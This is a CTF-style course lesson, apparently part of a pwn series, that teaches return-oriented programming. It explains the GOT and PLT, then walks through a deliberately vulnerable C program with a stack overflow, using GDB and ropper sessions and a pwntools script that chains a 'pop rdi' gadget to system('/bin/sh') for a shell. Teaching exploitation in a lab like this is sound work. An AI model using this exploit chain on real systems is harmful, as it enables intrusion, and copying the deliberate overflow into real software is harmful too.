<h1 align="center">PWN 302</h1>
  <p align="center">
  Return-oriented Programming
  </p>

### Table of contents

- [Introduction](#introduction)
- [GOT and PLT](#got-and-plt)
- [The Vulnerable Binary](#the-vulnerable-binary)
- [ROP Gadgets](#rop-gadgets)
- [ROP Chains](#rop-chains)
- [Practice](#practice)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

The [NX bit](https://en.wikipedia.org/wiki/NX_bit) is an exploit mitigation technology used in processors that allows certain areas of code to be marked as either executable or non-executable. Usually, the stack will be marked as a non-executable section of memory. When this happens, we will be unable to simply inject our shellcode onto the stack and set `rip` equal to the start of our shellcode, which makes it more difficult to write out our exploits. The NX bit will prevent `rip` from being set equal to anything in a non-executable section of memory, so we will have to find a way around it.

In this course, we will be going over the [ROP technique](https://en.wikipedia.org/wiki/Return-oriented_programming), which can allow us to execute code even when the NX bit is enabled. The basic idea here is to reuse code that is already marked as executable instead of injecting our own non-executable shellcode onto the stack. In other words, we'll overwrite the return address with the address of executable code that already exists in the binary, and we'll be able to execute code that way.

For example, we might modify the return address to be the address of a `pop rdi` instruction in an executable section of memory. When this happens, the `pop rdi` instruction will be executed (since it's in an executable section of memory), and we can therefore control the value of `rdi`. If the `pop rdi` instruction is immediately followed by a `ret` instruction, then we can continue to jump to another executable instruction by overwriting the return address twice. The `pop rdi` instruction in this example is something that is known as a ROP gadget (more on this later).

## GOT and PLT

Before we get into the ROP technique itself, we'll go over what the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) are. Although you're technically not required to understand these two things in order to do return-oriented programming, you will want to know how they work for the exploit that we'll be going over later.

The GOT is a table of memory addresses, and the location of the GOT is always known at runtime. The GOT is used to store the address of various functions in libraries that are loaded into the program. As you should know by now, the addresses of various functions can change when ASLR is enabled, so the only way for a running process to know the location of a certain library function is by looking it up inside of the GOT. You can think of the GOT as a phonebook that contains the addresses for functions that are used throughout the program. 

Note that the GOT is usually located in a writable section of memory (which is known as partial RELRO). We won't be going over this attack in this course, but you can keep in mind that it is possible to [perform an attack by changing the values in the GOT](https://nihaal-prasad.github.io/2021/01/03/got-overwrite-using-format-strings.html) (shameless plug). If full RELRO is enabled (which is uncommon), then the program will resolve all symbols at startup and then mark the the GOT as read-only, which mitigates against GOT overwrites.

The PLT contains entries for every external library function in the program. The PLT entry for a function contains some executable code that looks up the address of the function inside of the GOT and jumps to that address. If this is the first time that the function has been called, then the GOT entry will simply point to some code that will figure out the real address of the function. The second time that the function gets called, the GOT entry should point to the real address of the function.

To sum this up, here are the following steps that occur when a library function is called:
1. The program wants to call some function `x()`, which is located in an external library.
2. The program first jumps to `x@plt`, which is the PLT entry for `x()`.
3. The code at `x@plt` will lookup the function pointer stored at the GOT entry for `x()`.
4. The code at `x@plt` will set `rip` equal to the value of the function pointer that was stored in the GOT entry for `x()`.
5. If this is the first time that `x()` has been called:
    - `x@got.plt` will simply jump to the line of code that comes right after `x@plt`.
    - The code that comes right after `x@plt` will call a function that will figure out the actual address of `x()`.
    - After the address is found, `x@got.plt` will be replaced with a pointer to the address of `x()`.
6. If this is not the first time that `x()` has been called, then the GOT entry for `x()` should already be pointing to the actual address of `x()`, so we would have already started executing `x()` at step 4.

Below is an example of what this process looks like in assembly. This code was copied from GDB while it was running the binary that we will soon exploit.

```sh
 → 0x555555555154 <main+15>        call   0x555555555030 <system@plt>
   ↳  0x555555555030 <system@plt+0>   jmp    QWORD PTR [rip+0x2fe2]        # 0x555555558018 <system@got.plt>
      0x555555555036 <system@plt+6>   push   0x0
      0x55555555503b <system@plt+11>  jmp    0x555555555020
```

In this code segment, we can see that `rip` is set equal to `0x555555555154`, where the `main()` function is trying to call `system()`. Since the `main()` function has no clue what the address of `system()` is, it instead jumps to the PLT entry for `system()`, which is located at `0x555555555030`. The first line of code in the PLT entry will dereference the GOT entry of `system()` (located at `rip+0x2fe2`) and jump to the function pointer stored in the GOT entry of `system()`.

The first time that `system()` is called, `QWORD PTR [rip+0x2fe2]` will be equal to `system@plt+6`, so the program will just jump to the very next line in the PLT. In order to dynamically resolve the address of `system()`, the program will jump to a function located at `0x555555555020`, which changes the value stored in the GOT entry of `system()` and jumps to `system()`. If this isn't the first time that `system()` is being called, then `QWORD PTR [rip+0x2fe2]` should already be set equal to the address of `system()`, and there should be no problem if we just jump to `QWORD PTR [rip+0x2fe2]`.

If you're still confused, you may want to take a look at [this](https://www.codeproject.com/articles/1032231/what-is-the-symbol-table-and-what-is-the-global-of). You don't need to completely understand the GOT and PLT in order to do this next attack, but it would still be a good idea for you to at least know what they are.

## The Vulnerable Binary

```c
#include <stdio.h>
#include <stdlib.h>

const static char *bin_sh = "/bin/sh";

int main() {
    char buf[20];
    system("ls");
    fgets(buf, 100, stdin);
    return 0;
}
```

Today's vulnerable code is going to be interesting because we will be compiling it with the NX bit enabled. We can use the `checksec` command in GEF to ensure that the NX bit is actually enabled. Note that we'll be doing this entire lab while ASLR is disabled so that we don't have to worry about leaking memory or calculating addresses.

```sh
$ gcc -o rop -fno-stack-protector rop.c

$ gdb rop
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 10.1 using Python engine 3.9
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from rop...
(No debugging symbols found in rop)
gef➤  checksec
[+] checksec for '/home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop'
Canary                        : ✘
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Partial
gef➤
```

Let's figure out how many bytes it takes to overwrite the return address using `cyclic`.

```sh
gef➤  !cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
gef➤  run
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop
[Detaching after vfork from child process 3042]
exploit.py  README.md  rop  rop.c
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000555555555177 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x0
$rsp   : 0x00007fffffffdfc8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00005555555592a1  →  "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]"
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x0000555555555177  →  <main+50> ret
$r8    : 0x00007fffffffdfa0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0x00007ffff7fadbe0  →  0x00005555555596a0  →  0x0000000000000000
$r10   : 0x6e
$r11   : 0x246
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffdfd0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffdfd8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaa"
0x00007fffffffdfe0│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaa"
0x00007fffffffdfe8│+0x0020: "saaataaauaaavaaawaaaxaaayaa"
0x00007fffffffdff0│+0x0028: "uaaavaaawaaaxaaayaa"
0x00007fffffffdff8│+0x0030: "waaaxaaayaa"
0x00007fffffffe000│+0x0038: 0x0000555500616179 ("yaa"?)
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555516c <main+39>        call   0x555555555040 <fgets@plt>
   0x555555555171 <main+44>        mov    eax, 0x0
   0x555555555176 <main+49>        leave
 → 0x555555555177 <main+50>        ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "rop", stopped 0x555555555177 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555177 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  !cyclic -l kaaa
40
```

We know that we can overwrite the return address after 40 bytes, but we can't just throw out some shellcode on the stack like we did before because the stack has been marked as non-executable. Instead, we'll have to find another way to execute `system("/bin/sh")`.

## ROP Gadgets

Our goal is to get a shell, which takes two steps to do:
1. Set `rdi` equal to a pointer to "/bin/sh"
2. Jump to `system()`

We can change the value of `rdi` by using a ROP gadget. ROP gadgets are small segments of code that end with a `ret` instruction. We can search for ROP gadgets by using the `ropper` tool in GEF. The `ropper` command will only search through executable sections of memory, so if we overwrote the return address with the address of a ROP gadget, then we'll be able to execute the ROP gadget.

```sh
$ gdb rop
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 10.1 using Python engine 3.9
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from rop...
(No debugging symbols found in rop)
gef➤  b main
Breakpoint 1 at 0x1149
gef➤  r
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop

Breakpoint 1, 0x0000555555555149 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555555145  →  <main+0> push rbp
$rbx   : 0x0
$rcx   : 0x00007ffff7fad718  →  0x00007ffff7fafb00  →  0x0000000000000000
$rdx   : 0x00007fffffffe0c8  →  0x00007fffffffe3f4  →  "COLORFGBG=15;0"
$rsp   : 0x00007fffffffdfc0  →  0x0000555555555180  →  <__libc_csu_init+0> push r15
$rbp   : 0x00007fffffffdfc0  →  0x0000555555555180  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffe0b8  →  0x00007fffffffe3c3  →  "/home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop"
$rdi   : 0x1
$rip   : 0x0000555555555149  →  <main+4> sub rsp, 0x20
$r8    : 0x0
$r9    : 0x00007ffff7fe2180  →  <_dl_fini+0> push rbp
$r10   : 0x0
$r11   : 0x0
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc0│+0x0000: 0x0000555555555180  →  <__libc_csu_init+0> push r15  ← $rsp, $rbp
0x00007fffffffdfc8│+0x0008: 0x00007ffff7e15d0a  →  <__libc_start_main+234> mov edi, eax
0x00007fffffffdfd0│+0x0010: 0x00007fffffffe0b8  →  0x00007fffffffe3c3  →  "/home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop"
0x00007fffffffdfd8│+0x0018: 0x0000000100000000
0x00007fffffffdfe0│+0x0020: 0x0000555555555145  →  <main+0> push rbp
0x00007fffffffdfe8│+0x0028: 0x00007ffff7e157cf  →  <init_cacheinfo+287> mov rbp, rax
0x00007fffffffdff0│+0x0030: 0x0000000000000000
0x00007fffffffdff8│+0x0038: 0x104fda818a7b57cd
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555140 <frame_dummy+0>  jmp    0x5555555550c0 <register_tm_clones>
   0x555555555145 <main+0>         push   rbp
   0x555555555146 <main+1>         mov    rbp, rsp
 → 0x555555555149 <main+4>         sub    rsp, 0x20
   0x55555555514d <main+8>         lea    rdi, [rip+0xeb8]        # 0x55555555600c
   0x555555555154 <main+15>        call   0x555555555030 <system@plt>
   0x555555555159 <main+20>        mov    rdx, QWORD PTR [rip+0x2ee0]        # 0x555555558040 <stdin@@GLIBC_2.2.5>
   0x555555555160 <main+27>        lea    rax, [rbp-0x20]
   0x555555555164 <main+31>        mov    esi, 0x64
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "rop", stopped 0x555555555149 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555149 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  ropper --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop
0x00005555555551db: pop rdi; ret;

gef➤
```

There is a `pop rdi` instruction at `0x00005555555551db`, which means that if we replace the return address with `0x00005555555551db`, it will execute the `pop rdi` instruction. We can insert the address of "/bin/sh" on the stack right after the return address, and the `pop rdi` instruction should pop that value off of the stack and into `rdi`.

There is a `ret` instruction that occurs right after the `pop rdi` instruction in the ROP gadget. The `ret` instruction will set `rip` equal to the next value on the stack, meaning that we can execute another line of code by setting the next value on the stack to be another ROP gadget. In other words, we can overwrite the return address twice.

To figure out the address of "/bin/sh", we can use the `find` command in GDB. The `info proc map` command can help us view the memory addresses that we'll search through.

```sh
gef➤  info proc map
process 3074
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop
      0x555555555000     0x555555556000     0x1000     0x1000 /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop
      0x555555556000     0x555555557000     0x1000     0x2000 /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop
      0x555555557000     0x555555558000     0x1000     0x2000 /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop
      0x555555558000     0x555555559000     0x1000     0x3000 /home/nihaal/Desktop/ctf-courses/Pwn/PWN 302/rop
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7e14000     0x7ffff7f5f000   0x14b000    0x25000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7f5f000     0x7ffff7fa9000    0x4a000   0x170000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7fa9000     0x7ffff7faa000     0x1000   0x1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7faa000     0x7ffff7fad000     0x3000   0x1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7fad000     0x7ffff7fb0000     0x3000   0x1bd000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7fb0000     0x7ffff7fb6000     0x6000        0x0
      0x7ffff7fcc000     0x7ffff7fd0000     0x4000        0x0 [vvar]
      0x7ffff7fd0000     0x7ffff7fd2000     0x2000        0x0 [vdso]
      0x7ffff7fd2000     0x7ffff7fd3000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7fd3000     0x7ffff7ff3000    0x20000     0x1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ff3000     0x7ffff7ffb000     0x8000    0x21000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x29000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2a000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
gef➤  find 0x555555554000,0x555555559000,"/bin/sh"
0x555555556004
warning: Unable to access 12284 bytes of target memory at 0x555555556005, halting search.
1 pattern found.
gef➤  x/s 0x555555556004
0x555555556004: "/bin/sh"
```

The address of the "/bin/sh" string in the binary is `0x555555556004`. All we have to do now is to figure out the address of `system()`. Once we do that, we can overwrite the return address with the address of `system()` to execute it.

```sh
gef➤  disas main
Dump of assembler code for function main:
   0x0000555555555145 <+0>:     push   rbp
   0x0000555555555146 <+1>:     mov    rbp,rsp
=> 0x0000555555555149 <+4>:     sub    rsp,0x20
   0x000055555555514d <+8>:     lea    rdi,[rip+0xeb8]        # 0x55555555600c
   0x0000555555555154 <+15>:    call   0x555555555030 <system@plt>
   0x0000555555555159 <+20>:    mov    rdx,QWORD PTR [rip+0x2ee0]        # 0x555555558040 <stdin@@GLIBC_2.2.5>
   0x0000555555555160 <+27>:    lea    rax,[rbp-0x20]
   0x0000555555555164 <+31>:    mov    esi,0x64
   0x0000555555555169 <+36>:    mov    rdi,rax
   0x000055555555516c <+39>:    call   0x555555555040 <fgets@plt>
   0x0000555555555171 <+44>:    mov    eax,0x0
   0x0000555555555176 <+49>:    leave
   0x0000555555555177 <+50>:    ret
End of assembler dump.
gef➤
```

We don't even have to use the real address of `system()` for our exploit to work. We can just jump to the PLT entry of system, which will figure out the real address of `system()` for us. The PLT entry of `system()` is located at `0x555555555030` in this binary, which will be our second ROP gadget.

## ROP Chains

Since we are overwriting the return address twice, we are creating something called a ROP chain. A ROP chain, as the name implies, is a chain of ROP gadgets. Each ROP gadget should end with a `ret` instruction, and when that `ret` instruction is executed, `rip` will pop off the address of the next ROP gadget from the stack and execute it.

```python
#!/usr/bin/env python3
from pwn import *

io = process("./rop", stdin=PTY)
# gdb.attach(io)

pop_rdi = p64(0x00005555555551db) # ropper --file rop --search "pop rdi"
bin_sh = p64(0x555555556004) # info proc map + find 0x555555554000,0x555555559000,"/bin/sh"
system = p64(0x555555555030) # disas main

payload = b'A'*40
payload += pop_rdi
payload += bin_sh
payload += system

io.sendline(payload)
io.interactive()
```

We first type out 40 bytes of junk values to reach the return address. Next, we replace the return address with the address of a `pop rdi; ret;` ROP gadget. The program will execute the `pop rdi` instruction, and since the next thing on the stack is the address of a "/bin/sh" string, `rdi` will be set equal to the address of "/bin/sh". When the second `ret` instruction is executed, the program will set `rip` equal to the next value on the stack, which in this case is the PLT entry of `system()`. This is equivalent to calling `system("/bin/sh")`.

```sh
$ ./exploit.py
[+] Starting local process './rop': pid 3190
[*] Switching to interactive mode
exploit.py  README.md  rop  rop.c
$ $ whoami
nihaal
$ $ echo ROP rules!
ROP rules!
$ $
```

Our ROP chain only has two ROP gadgets: one for executing `pop rdi` and another for executing `system()`. However, you could make the ROP chain as long as you want (or at least until `fgets()` decides to stop reading your input). If you had enough ROP gadgets, you could theoretically rewrite the entire shellcode that we've been using with only ROP gadgets (though that would be a lot more difficult than just calling libc's `system()` function like we did above).

## Practice

The best way to practice creating ROP chains is to go through the challenges in [ROP Emporium](https://ropemporium.com/). These challenges will help you get better at return-oriented programming, and they'll help you understand how to get though common challenges when dealing with ROP chains. 

## More Resources:
- [NX bit](https://en.wikipedia.org/wiki/NX_bit)
- [Symbol Table & Global Offset Table](https://www.codeproject.com/articles/1032231/what-is-the-symbol-table-and-what-is-the-global-of)
- [ROP Emporium](https://ropemporium.com/)
- [Nightmare's ROP Writeups](https://guyinatuxedo.github.io/rop.html)

## Creators

**Nihaal Prasad**

Enjoy :metal:
